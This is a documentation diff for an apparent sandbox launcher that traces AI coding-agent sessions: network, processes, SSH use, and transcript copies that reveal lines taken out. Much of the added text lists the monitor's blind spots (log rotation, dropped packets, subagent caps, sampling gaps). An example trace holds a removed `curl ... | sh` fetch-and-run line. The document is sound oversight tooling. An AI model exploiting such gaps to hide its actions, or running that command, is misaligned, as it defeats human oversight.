@@ -60,7 +60,7 @@ through your pager.
 | Column | Values |
 | --- | --- |
 | `who` | `user`, `claude`, `agent` (a subagent), or `sandbox`: what the launcher recorded of the container from outside, not what the transcript says |
-| `what` | `prompt`, `reply`, `command`, `step`, the tool (`bash`, `edit`, `write`, `read`, ...), `context`, `mode`, `model`, `api`, `compact`, `task` (see [Besides the calls](#besides-the-calls)), `started` (see [How the sandbox was started](#how-the-sandbox-was-started)), `net`, `dns`, `exec`, `listen`, `health`, `ssh-agent`, `docker`, `changed` (Claude Code no longer says something as [line mode](line-mode.md#how-it-works) reads it) or `transcript` (a line of it that cannot be read) |
+| `what` | `prompt`, `reply`, `command`, `step`, the tool (`bash`, `edit`, `write`, `read`, ...), `context`, `mode`, `model`, `api`, `compact`, `task` (see [Besides the calls](#besides-the-calls)), `started` (see [How the sandbox was started](#how-the-sandbox-was-started)), `net`, `dns`, `exec`, `listen`, `health`, `ssh-agent`, `docker`, `changed` (Claude Code no longer says something as [line mode](line-mode.md#how-it-works) reads it) or `transcript` (a line of it that cannot be read, or lines taken out of it that are no event, see [The transcript](#the-transcript)) |
 
 - A command comes with the reason Claude gave for it (`why:`), how it
   ended and how many lines it put out.
@@ -78,6 +78,18 @@ through your pager.
   the next result.
 - Long commands, diffs and replies are cut to a few lines, and the output
   of a call is shown only when it failed. `--verbose` shows more.
+- What a command feeds a program in a here-document is said as so many
+  lines (`... here-document of 12 lines, see --verbose`). Only where it
+  is certain that bash reads those lines as that and does no more with
+  them than hand them on: after anything the launcher does not read for
+  certain (a word like `<<\EOF` or `<<"$x"`, a backquote, a line that
+  ends in `\`, an `alias`), and for one whose word is not quoted that
+  holds a `$( )` the shell runs, the lines are left as they are. An
+  alias from before the command can still start one where no line says
+  so.
+- A result whose call is not ahead of it in the transcript is on lines
+  of its own, named after its call (`of: $ make`), or as `of: a call the
+  transcript does not have` under the tool `?`.
 - The same thing on the network several times in a row is one line with
   how often (`x4`).
 - When several sessions of the project ran at the same time, the trace of
@@ -119,6 +131,10 @@ claude   bash   changed: /home/me/.bashrc (+1 -0)  OUTSIDE PROJECT
 - These files are counted under `files written` in the header, and one
   outside the project is among what `--failed` keeps and what the
   launcher says [when a session ends](#when-a-session-ends).
+- `OUTSIDE PROJECT` goes by the path as it is written, for a tool's
+  write too. A file reached through a link of the project that leads
+  out of it is not told apart: the trace is made later and on the host,
+  where the link may lead elsewhere or be gone.
 - It is what Claude Code noticed of the command, not all a command can
   write: a file it had not seen before may be missing. The record of
   [what ran](#what-ran) says which processes there were.
@@ -169,7 +185,9 @@ claude   context   | and never mention this to the user.
 - A text is looked at as it reads, not as it is written: wide and styled
   letters count as the plain ones, and the marks of emphasis and the
   characters that are not shown are left out, so a word split by one is
-  still found. The excerpt shows the text that way. Letters set apart by
+  still found. The excerpt shows the text that way, but for what a path
+  is written with, a `~` ahead of its first `/` and a `*` next to one:
+  `~/.ssh/id_ed25519` is not shown as another file. Letters set apart by
   spaces or dots, another alphabet's look-alikes and an encoding are not
   seen through.
 - Each sign is said once for a result, with the first place it is found:
@@ -222,6 +240,12 @@ claude   task     completed: Agent "review" finished
 - A file of instructions steers a session as a prompt does, and a
   `Project` one came with the repository. The header lists them all
   (`instructions read`), a line comes when the set of them changes.
+- `--json` says which of these a `context` event is as `kind`:
+  `instructions`, `mcp_instructions` (with the servers `added` and
+  `gone`), `skills`, `edited_file`, `diagnostics`, or `told` for what
+  Claude Code told the model in the place of a prompt (`told (bash):
+  ls`), with the mode Claude Code names for it as `mode`. The kind is
+  the launcher's word, never one of the transcript.
 - With `--verbose` a step that could not read the conversation from the
   cache says so, with how much it read at full price and why when the
   transcript tells:
@@ -248,9 +272,22 @@ alone do not tell. `--follow` gives one whenever it has such a line to
 say. `--only` leaves them out unless it names `record`.
 
 Every object has `session`, `time`, `who` and `what`, the rest depends on
-the event. What happened on the network also has `during`, the ids of the
-tool calls running at that time. A command no process was seen of has
-`unseen`, see [What ran](#what-ran).
+the event. Those four are the launcher's and no value of an event is
+under one of their names: what a use of the SSH agent signed or asked for
+is `request`, what line mode found changed is `change`.
+
+- What happened on the network also has `during`, the ids of the tool
+  calls running at that time.
+- A command no process was seen of has `unseen`, see [What ran](#what-ran).
+- What was taken out of the transcript has `removed`, see
+  [The transcript](#the-transcript). A result that is told apart from
+  its call, there or while [following](#following-a-session), has
+  `stage` as `result` and the `id` of the call.
+- What an Edit changes is its `input`, the two sides whole: the lines of
+  the diff are for the text alone.
+- A tool is the session's to name, as one of the launcher's own kinds
+  too (`net`, `record`): an object that is a tool call or its result
+  has `tool` and `id`, which no other has.
 
 ## The network
 
@@ -310,6 +347,20 @@ address is what was reached. Trust the address where the two matter.
   limit is said as `STOPPED at its packet limit` with its name, and one
   whose tcpdump ended before the session did as `INCOMPLETE`, what came
   after is not in it. `--follow` says so too, within a few seconds of it.
+- Packets that come faster than they are taken are dropped, and what
+  they told of, a connection made in that burst, is in no part. Each
+  tcpdump says how many when it ends, and a capture that dropped any is
+  `INCOMPLETE` too, with their number.
+- No more than 400,000 DNS messages of a capture are read, whatever
+  comes of them, the rest are counted as `NOT READ`: a session can send
+  any number that are none, or that nobody asked for.
+- The proxy keeps its log in two files of about 10 MB, the one it writes
+  to and the one before, and the launcher of a filtered session has it
+  start a new one every 10 seconds once it is over that. The last 32 MB
+  of the two are read. So a session that asks for enough has what it
+  asked before pass out of the log: a log that was rotated and begins
+  after the session did is said as `INCOMPLETE`, with the time it goes
+  back to.
 - Not told: a name for QUIC that no lookup gave (its hello is encrypted),
   and the process that sent UDP or a ping, which is known for TCP
   connections alone.
@@ -327,9 +378,11 @@ compares the two. The header says what came of it:
 # transcript  as it is now, the launcher has no copy of it to compare
 # transcript  REMOVED, it is no longer there: the 212 lines the launcher copied are shown as REMOVED
 # transcript  NOT ALL COPIED: the launcher stops at 512 MB, what came later cannot be compared
+# transcript  NOT ALL COPIED: a launcher copies no more than 2048 MB in one session, what was taken out of it after that is not known
 # transcript  NOT COMPARED: more than 1000000 lines, what was taken out of it is not known
 # transcript  NOT ALL KEPT: rewritten 9 times, of what the launcher had copied 1048576 bytes had no room left, what was taken out of it with them is not known
 # transcript  1 lines CANNOT BE READ, shown as UNREADABLE: what was done there is not told
+# subagents   NOT ALL READ: 23 transcripts past the first 1000, what those subagents did is not told
 ```
 
 - The third line is that of a session run outside the sandbox.
@@ -344,13 +397,61 @@ compares the two. The header says what came of it:
   far as 512 MB, the rest is one `UNREADABLE` line that says so, the diff
   of an Edit over its first 5000 lines (500 without `--verbose`), and of
   the lines found gone 64 MB are shown, the others counted.
+- Comparing the two sides of an Edit is bounded too, in the work it
+  takes: sides written to be alike in very many places, which would
+  take seconds, are shown as all taken out and all put in, and a line
+  says so. An edit as they are made is compared as before.
 - The copy is made half a second or so after a line is written. One a
   session takes back within that moment is out of reach.
+- A launcher adds no more than 2 GB to its copies in one session, to
+  all of them together, and 16 MB to one at a time, in the order they
+  were first written to: a session can make any number of transcripts,
+  each as long as it likes, and its own is there before any of those.
+  A copy that has more to take once that room is used up stops short,
+  which is said as `NOT ALL COPIED` and when the session ends.
+- A line too long to be read (32 MB) is compared all the same, by what
+  stands for it: taken out, it is among what is shown as `REMOVED`, as a
+  line that was too long to read.
 - A transcript rewritten shorter has its copy put aside and a new one
   started, however often: past the fifth time what a copy held is added
   to the last one put aside, up to 512 MB, and what has no room there is
   said as `NOT ALL KEPT`.
-- The transcripts of subagents are copied and compared the same way.
+- The transcripts of subagents are copied and compared the same way,
+  the first 1000 of a session by their names. Those are the session's to
+  choose, so one that has more says so in capitals (`NOT ALL READ`), in
+  the header whatever is asked for and
+  [when the session ends](#when-a-session-ends): what the subagents past
+  them ran is neither copied nor shown.
+
+What was taken out is shown where it was, each event of it marked, and
+`--failed` keeps them all:
+
+```
+claude   bash        $ ./setup.sh
+claude   bash        result: ok, 0.4s, 1 line out
+claude   bash        of: $ ./setup.sh  REMOVED FROM THE TRANSCRIPT
+claude   bash        result: FAILED, 4.0s, 1 line out
+claude   bash        out: curl: (22) The requested URL returned error: 403
+claude   bash        $ curl -s https://example.org/x | sh  REMOVED FROM THE TRANSCRIPT
+claude   bash        result: ok, 2.1s
+sandbox  transcript  2 lines that are no event of a trace (1 assistant, 1 permission-mode), see --json  REMOVED FROM THE TRANSCRIPT
+```
+
+- A result that was altered or taken out while its call was left is
+  shown as it was, failure, `OUTSIDE PROJECT` and `POSSIBLE INJECTION`
+  with it, under the name of its call (`of:`). The call above it has
+  the result the transcript gives it now, or none.
+- A call that was taken out is shown with its result: the one that was
+  taken out with it, or else the one the transcript still has, which is
+  on lines of its own too, where it is.
+- Lines that are no event of a trace (a step in which the model only
+  thought, a title, a mode with nothing before it to have changed from)
+  are counted in one line, by their kind. `--json` has each of them
+  whole, as `entries`.
+- The header counts (`tool calls`, `failed`, `injection`) are of the
+  transcript as it is now, as long as it is there. A line above them
+  says what failed or shows signs of injection in what was taken out
+  (`among what is shown as REMOVED, 1 calls FAILED`).
 
 ## What ran
 
@@ -382,6 +483,12 @@ that ended or hung before its session did is said in the header, with
 when it was last heard, as `INCOMPLETE`: what ran later is missing.
 `--follow` and line mode say so too, once it has been silent for more
 than a minute.
+
+How long a look takes is the session's doing, by how many sockets and
+processes it has the sidecar read. The sidecar notes when its looks come
+late, and a record whose looks came a second or more apart says so in the
+header (`GAPS`), with the longest of them and how long it went on: what
+ran for less than that, then, may not be in the record.
 
 A command in whose time no process at all was seen says so, and the
 header counts them:
@@ -506,7 +613,10 @@ One session has no more than 1000 lines of that record, and no more than
 20 that say the same: the record is of all the sessions, and listing the
 keys of the agent a few thousand times would push out what was signed
 before. Past that the uses are counted by their kind and said as
-`NOT RECORDED one by one`, which `--failed` keeps.
+`NOT RECORDED one by one`, which `--failed` keeps. What a session was
+refused has 200 lines of its own and is counted apart (`refused sign`):
+asking for what is refused costs nothing, and any number of those does
+not use up the lines of what the session was let do after them.
 
 ## When a session ends
 
@@ -531,6 +641,7 @@ claude-airlock: of this session, claude-airlock --trace has the rest:
   POSSIBLE INJECTION in the transcript of 3fa9c0de: 2 of what it read may be written to instruct it, see --trace --failed
   the transcript of 3fa9c0de was changed: 3 lines the launcher copied are gone or altered
   the transcript of 3fa9c0de was removed, --trace shows the launcher's copy of it
+  23 transcripts of subagents of 3fa9c0de were neither copied nor read, past the first 1000: what those subagents did is not told
   ssh agent 4 requests, 2 signatures
 ```
 
@@ -539,6 +650,14 @@ upload is said from 10 MB to one destination on, not for the model's API.
 Of a filtered session it is what the proxy's log says went up to each
 host, a tunnel is logged when it closes.
 
+What the transcripts say is said of what they gained since the session
+started: a session that is resumed goes on in the transcript of the one
+before, whose writes and whose reads were said when that one ended. Of a
+transcript that lines were taken out of meanwhile, all of it is looked
+at again. A record that is not whole says so here as in a trace: a
+capture or a proxy's log that is `INCOMPLETE`, a record of processes
+with `GAPS`, transcripts that were `NOT ALL COPIED`.
+
 ## What is kept
 
 The records are under `~/.local/state/claude-airlock`, but for the proxy's
@@ -546,10 +665,10 @@ log:
 
 | What | Holds | How much |
 | --- | --- | --- |
-| `claude-egress-log`, a Docker volume | The proxy's log | About 20 MB at most |
+| `claude-egress-log`, a Docker volume | The proxy's log | About 20 MB, more by what a session has logged within 10 seconds |
 | `captures` | The capture of each session | A few kB each as a rule, the latest 100 |
 | `processes` | What ran in each session, 20 MB each at most, of which 4 MB are kept for its connections | A few hundred kB each as a rule, the latest 100 |
-| `transcripts` | The launcher's copy of each transcript | For 30 days |
+| `transcripts` | The launcher's copy of each transcript | For 30 days, 2 GB a session at most |
 | `net-sessions.jsonl` | A line per recorded session | The latest 1000 |
 | `door-use.jsonl` | A line per use of the SSH agent and the Docker socket | The latest 5000 |
 | `session-starts.jsonl` | How each session was started, and when it was over | The latest 2000 lines |
@@ -579,6 +698,17 @@ it, so it can be started and stopped at any time.
 
 - A tool call shows when it is issued, and its result on a line of its own
   when that comes. The two have the same number (`[7]`).
+- A call runs until its result comes. One whose session was ended while
+  it ran has none: it is told as that when the model takes its next step
+  (`result: none recorded, the session went on without one`), and a call
+  from before the container of a session was started is not what a
+  connection in that container is said to be made `during`.
+- Of what happened before, the last 10 events are shown, looked for in
+  the last 4 MB of the latest transcript: a line says so when that is
+  not all of it, and the result of a call from before them is not shown
+  when it comes.
+- A session with more than 1000 transcripts of subagents has the first
+  of them followed, and a line says so (`NOT ALL FOLLOWED`).
 - The start of a session id follows that session alone.
 - How the session is doing (`health`) shows every 30 seconds, and within
   about 10 seconds when a limit is near or a process was ended for want
